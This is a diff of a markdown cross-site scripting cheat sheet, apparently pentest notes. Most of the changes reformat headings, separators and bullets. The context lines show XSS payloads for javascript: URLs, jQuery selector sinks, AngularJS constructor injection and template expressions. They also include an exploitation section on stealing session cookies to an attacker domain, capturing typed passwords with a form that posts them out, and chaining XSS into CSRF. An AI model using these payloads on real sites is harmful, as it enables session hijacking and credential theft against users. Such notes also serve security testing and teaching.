@@ -113,6 +113,8 @@ Exploit
 ?returnUrl=javascript:alert(document.domain)
 ```
 
+***
+
 jQuery's `$()` selector function in another potential sink. If you open the browser console and type `$('<img src=x onerror=alert()>')` jQuery creates this new element (so the alert will be shown)
 
 An example:
@@ -183,7 +185,8 @@ https://example.comnet/?search=%7B%7B%24on.constructor%28%27alert%281%29%27%29%2
 
 ### <mark style="color:yellow;">Reflected/Stored DOM XSS</mark>
 
-* If a script reads data from a URL and writes it to a dangerous sink, the vulnerability is client-side with no server processing.
+If a script reads data from a URL and writes it to a dangerous sink, the vulnerability is client-side with no server processing.
+
 * **Reflected DOM** vulnerabilities happen when the server processes and echoes data from a request, and a script on the page handles this data unsafely, writing it to a dangerous sink.
 
 ```javascript
@@ -318,7 +321,7 @@ ${alert(document.domain)}
 
 ## <mark style="color:yellow;">Exploitation</mark>
 
-Exploiting XSS to **steal cookies** and send the victim's cookies to your own domain
+### &#x20;<mark style="color:yellow;">S</mark><mark style="color:yellow;">**teal cookies**</mark>
 
 ```html
 <script>
@@ -337,9 +340,7 @@ Limitation:
 * Sessions might be locked to additional factors like the user's IP address.
 * The session might time out before you're able to hijack it.
 
-***
-
-Exploiting XSS to **capture passwords**
+### <mark style="color:yellow;">**Capture passwords**</mark>
 
 ```html
 <input name=username id=username>
@@ -350,9 +351,7 @@ body:username.value+':'+this.value
 });">
 ```
 
-***
-
-Exploiting XSS to **perform CSRF**
+### <mark style="color:yellow;">**Perform CSRF**</mark>
 
 * When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.
 * If the site use a token you can get it doing a first request and then add the token in a second request
